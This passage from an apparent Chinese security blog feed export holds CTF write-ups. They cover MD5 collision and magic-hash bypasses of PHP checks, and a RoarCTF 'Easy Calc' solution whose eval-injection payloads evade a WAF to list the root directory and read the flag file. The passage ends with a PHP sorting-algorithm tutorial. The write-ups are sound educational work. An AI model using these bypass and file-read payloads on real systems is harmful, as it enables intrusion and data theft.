的原型，这里就需要参考一篇文章：<a href="https://xz.aliyun.com/t/3161#toc-5" target="_blank" rel="noopener">基于全等的MD5碰撞绕过</a>、如文章所述（cmd中执行）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -o 0 1    -o参数代表随机生成两个相同MD5的文件</span><br><span class="line">fastcoll_v1.0.0.5.exe -p 1 -o 00 01    -p参数代表根据1文件随机生成两个相同MD5的文件，注意：生成的MD5与1不同</span><br><span class="line">tail.exe -c 128 00 &gt; a    -c 128代表将00的最后128位写入文件a，这128位正是1与00的MD5不同的原因</span><br><span class="line">tail.exe -c 128 01 &gt; b    同理</span><br><span class="line">type 0 a &gt; 10    这里表示将0和a文件的内容合并写入10</span><br><span class="line">type 0 b &gt; 11    这里表示将0和b文件的内容合并写入11</span><br></pre></td></tr></table></figure><p><a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip" target="_blank" rel="noopener">fastcoll下载链接</a>、<a href="https://www.trisunsoft.com/tail-for-windows.htm" target="_blank" rel="noopener">tail.exe下载链接</a></p><p>这样就生成了4个MD5值相同的文件，查看四个文件的MD5值，是预期结果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227120733977.png" alt=""></p><p>于是在PHP中生成其中三个的urlencode的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>.md5((readmyfile(<span class="string">"00"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.urlencode(readmyfile(<span class="string">"00"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode (readmyfile(<span class="string">"00"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>.md5((readmyfile(<span class="string">"10"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.urlencode(readmyfile(<span class="string">"10"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode(readmyfile(<span class="string">"10"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>.md5((readmyfile(<span class="string">"11"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.urlencode(readmyfile(<span class="string">"11"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5( urlencode(readmyfile(<span class="string">"11"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227121027756.png" alt=""></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">二进制hash 4e7b1d0c72b69df7992d15f72f7c2056</span><br><span class="line"></span><br><span class="line">URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95hWq%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4%C9K%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6%C2l%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%9C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%93I%01%21%24%B9%D7%EDb%97Hk%21%5DX6%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81</span><br><span class="line"></span><br><span class="line">URLENCODE hash c09ff9138646c9e4ad9234d07ed6f935</span><br><span class="line"></span><br><span class="line">二进制hash 4e7b1d0c72b69df7992d15f72f7c2056</span><br><span class="line"></span><br><span class="line">URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81</span><br><span class="line"></span><br><span class="line">URLENCODE hash 6b9eaae07963a665dcc4cabcad530507</span><br><span class="line"></span><br><span class="line">二进制hash 4e7b1d0c72b69df7992d15f72f7c2056</span><br><span class="line"></span><br><span class="line">URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%9B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%0B%06jh%FE%8A%BCc%9F%16%2A%A6%93%0A%2B%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%5E%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7DAo%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%BCm%14%3C%81</span><br><span class="line"></span><br><span class="line">URLENCODE hash 559062db66b89ca9e98b3900fc75066e</span><br></pre></td></tr></table></figure><p>复制到burp中发包，可以看到成功绕过了if，进入下面的if</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227121221514.png" alt=""></p><p>第7、8、9个if：POST两个值分别为<code>$a</code>和<code>$b</code>，<code>ctype_alnum()</code>表示函数内的值只能是字母个数字的组合，第7个if的意思我们的<code>$a</code>和<code>$b</code>需要满足<code>ctype_alnum()</code>函数，且长度不能大于五，第8个if的意思是get的参数<code>$m</code>和<code>$n</code>长度不能大于1，也就是只能为一个字符</p><p>后面的<code>$val8</code>为<code>$a</code>MD5加密后的值，<code>$val9</code>为<code>$b</code>结果MD5加密后，替换其中的<code>$m</code>值为<code>$n</code>的值</p><p>最后一个if：表示<code>$val8</code>和<code>$val9</code>的值都必须相等，注意这里是使用<code>==</code>进行判断，也就是说会认为<code>0e</code>开头的为科学计数法进行判断，<code>$a</code>和<code>$b</code>的值不能相等，且<code>$b</code>的长度必须为5</p><p>结果分析，有这种绕过方法：假设<code>$a</code>MD5加密后的值为<code>0e123421342...</code>、<code>$b</code>MD5加密后的值为<code>($m)e4657564745...</code>、就可以利用令<code>$n</code>=0来替换<code>$b</code>MD5加密后的第一位<code>$m</code>的值，从而构成绕过，这是我们只需要得到<strong>一个5位的MD5值开头<code>0e</code>后面跟的全是数字的MD5原型</strong>和<strong>一个5位的MD5值的第二位为e后面跟的全是数字的MD5原型</strong>，于是写脚本跑出这两个5位数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    str = <span class="string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> str:</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> str:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> str:</span><br><span class="line">                        payload = (i+j+m+n+k).encode(<span class="string">"utf-8"</span>)</span><br><span class="line">                        str1 = hashlib.md5(payload)</span><br><span class="line">                        test1 = str1.hexdigest()</span><br><span class="line">                        <span class="keyword">if</span> test1[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">"0e"</span> <span class="keyword">and</span> test1[<span class="number">2</span>:].isdigit():</span><br><span class="line">                            print(<span class="string">"&#123;&#125;-&gt;&#123;&#125;"</span>.format(payload,test1))</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">()</span>:</span></span><br><span class="line">    str = <span class="string">"qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> str:</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> str:</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> str:</span><br><span class="line">                        payload = (i+j+m+n+k).encode(<span class="string">"utf-8"</span>)</span><br><span class="line">                        str1 = hashlib.md5(payload)</span><br><span class="line">                        test2 = str1.hexdigest()</span><br><span class="line">                        <span class="keyword">if</span> test2[<span class="number">1</span>] == <span class="string">"e"</span> <span class="keyword">and</span> test2[<span class="number">2</span>:].isdigit():</span><br><span class="line">                            print(<span class="string">"&#123;&#125;-&gt;&#123;&#125;"</span>.format(payload,test2))</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    a()</span><br><span class="line">    b()</span><br></pre></td></tr></table></figure><p>得到的两个结果：</p><p><code>b&#39;byGcY&#39;-&gt;0e591948146966052067035298880982</code><br><code>b&#39;e2P2Z&#39;-&gt;3e297891816980937234055076451742</code></p><p>于是构造payload：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227130010106.png" alt=""></p><p>发包得到flag</p><h1 id="HTTP走私"><a href="#HTTP走私" class="headerlink" title="HTTP走私"></a>HTTP走私</h1><h2 id="2019RoarCTF—Easy-Calc"><a href="#2019RoarCTF—Easy-Calc" class="headerlink" title="2019RoarCTF—Easy Calc"></a>2019RoarCTF—Easy Calc</h2><h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206123430992.png" alt=""></p><p>查看源代码后发现存在<code>calc.php</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206123604958.png" alt=""></p><p>访问得到后台源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了大多数字符，尝试了提交一些字符会报<code>403</code>错误</p><blockquote><p>403错误是一种在网站访问过程中，常见的错误提示，表示资源不可用。服务器理解客户的请求，但拒绝处理它，通常由于服务器上文件或目录的权限设置导致的WEB访问错误。</p></blockquote><h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/6654#toc-1" target="_blank" rel="noopener">从一道题到协议层攻击之HTTP请求走私</a></li><li><a href="https://blog.csdn.net/yankai0219/article/details/8269922" target="_blank" rel="noopener">http协议中content-length 以及chunked编码分析</a></li><li><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></li></ul><h4 id="服务器http走私漏洞绕WAF"><a href="#服务器http走私漏洞绕WAF" class="headerlink" title="服务器http走私漏洞绕WAF"></a>服务器http走私漏洞绕WAF</h4><blockquote><p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=var_dump(base_convert(61693386291,10,36)(chr(47)))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144030983.png" alt=""></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=var_dump(base_convert(2146934604002,10,36)(chr(47).base_convert(25254448,10,36)))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144200310.png" alt=""></p><h4 id="PHP字符串解析特性绕过WAF"><a href="#PHP字符串解析特性绕过WAF" class="headerlink" title="PHP字符串解析特性绕过WAF"></a>PHP字符串解析特性绕过WAF</h4><p>PHP需要将所有参数转换为有效的变量名，因此，在解析查询字符串时，它会做两件事：</p><blockquote><ul><li>删除初始空格</li><li>将某些字符转换为下划线（包括空格）</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144515082.png" alt=""></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200206144617598.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些排序和查找算法</title>
      <link href="/2020/02/22/%E4%B8%80%E4%BA%9B%E6%8E%92%E5%BA%8F%E5%92%8C%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/"/>
      <url>/2020/02/22/%E4%B8%80%E4%BA%9B%E6%8E%92%E5%BA%8F%E5%92%8C%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>最近在看PHP的时候温习了一下原来学过的排序算法（忘的都差不多了-_-），故在此记录一下</p><h4 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打印数列</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="number">1</span>,<span class="number">2</span> =&gt; <span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = count($arr); $i &lt; <span class="number">15</span>; $i++)&#123;</span><br><span class="line">    $arr[$i + <span class="number">1</span>] = $arr[$i] + $arr[$i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">print_r($arr);<span class="comment">//打印数列前15位</span></span><br><span class="line"><span class="comment">//下面计算数列的第几位</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($n ==<span class="number">1</span> || $n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a($n - <span class="number">1</span>) + a($n <span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> a(<span class="number">15</span>);<span class="comment">//打印数列第15位</span></span><br></pre></td></tr></table></figure><h3 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h3><h4 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>);</span><br><span class="line">$len = count($arr);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $len - $i <span class="number">-1</span>;$j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($arr[$j] &gt; $arr[$j+<span class="number">1</span>])&#123;</span><br><span class="line">            $temp = $arr[$j];</span><br><span class="line">            $arr[$j] = $arr[$j+<span class="number">1</span>];</span><br><span class="line">            $arr[$j+<span class="number">1</span>] = $temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r($arr);</span><br></pre></td></tr></table></figure><h4 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>);</span><br><span class="line">$len = count($arr);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt;$len ;$i++)&#123;</span><br><span class="line">    $min = $i;</span><br><span class="line">    <span class="keyword">for</span> ($j = $i + <span class="number">1</span>;$j &lt; $len;$j++)&#123; <span class="comment">//这个for循环选出最小值</span></span><br><span class="line">        <span class="keyword">if</span>($arr[$j]&lt; $arr[$min])&#123;</span><br><span class="line">            $min = $j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($min != $i)&#123;  <span class="comment">//选择最小值放前面</span></span><br><span class="line">        $temp = $arr[$i];</span><br><span class="line">        $arr[$i] = $arr[$min];</span><br><span class="line">        $arr[$min] = $temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r($arr);</span><br></pre></td></tr></table></figure><h4 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>);</span><br><span class="line">$len = count($arr);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">    $temp = $arr[$i];    <span class="comment">//从第二个数据开始依次取出数据与前面已经排好的进行比较</span></span><br><span class="line">    $flag = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">for</span>($j = $i - <span class="number">1</span>; $j &gt;= <span class="number">0</span>;$j--)&#123;</span><br><span class="line">        <span class="keyword">if</span>($arr[$j] &gt; $temp)&#123;</span><br><span class="line">            $arr[$j + <span class="number">1</span>] = $arr[$j];</span><br><span class="line">            <span class="comment">//$arr[$j] = $temp;     //优化后略过了这一次赋值，意思就是temp元素依旧存在，没进入数组，当前面的元素都交换完成后，才在后面的if语句中进行最后的赋值操作</span></span><br><span class="line">            $flag = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">break</span>;   <span class="comment">//这里的作用是如果在判断的时候取出来的就已经比他左边的要大了，就不用进行交换了，直接break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($flag)&#123;  <span class="comment">//如果交换了，则进行temp赋值</span></span><br><span class="line">        $arr[$j + <span class="number">1</span>] = $temp; <span class="comment">//这里$j需要加一的原因是在上面的循环最后执行了一次$j--的操作，于是这里需要把1加上</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r($arr);</span><br></pre></td></tr></table></figure><h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quick_sort</span><span class="params">($arr)</span></span>&#123;</span><br><span class="line">    $len = count($arr);</span><br><span class="line">    <span class="keyword">if</span>($len &lt;= <span class="number">1</span>) <span class="keyword">return</span> $arr;</span><br><span class="line"></span><br><span class="line">    $left = $right = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">1</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($arr[<span class="number">0</span>] &gt; $arr[$i])&#123;</span><br><span class="line">            $left[] = 